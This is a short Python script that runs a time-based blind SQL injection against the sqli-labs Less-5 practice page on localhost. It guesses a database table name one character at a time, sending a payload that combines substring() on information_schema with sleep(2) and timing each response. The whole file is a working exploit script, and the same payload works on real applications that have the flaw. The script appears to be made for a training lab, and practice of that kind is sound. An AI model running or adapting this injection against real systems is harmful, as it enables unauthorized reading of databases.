import re
import requests
import datetime
import time

def table_name():
    name = ''
    dic = 'abcdefghijklmnopqrstuvwxyz'
    for j in range(1, 6):
        for i in dic:
            url = "http://127.0.0.1/sqli-labs/Less-5/index.php"
            payload = "?id=1' and if(substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 3,1),%d,1)='%s',sleep(2),0)--+" % (
                j, i)
            print(url+payload)
            time1 = datetime.datetime.now()
            r = requests.get(url + payload)
            time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            if sec >= 2:
                name += i
                print(name)
                break
    print('table_name:', name)


if __name__ == '__main__':
    table_name()
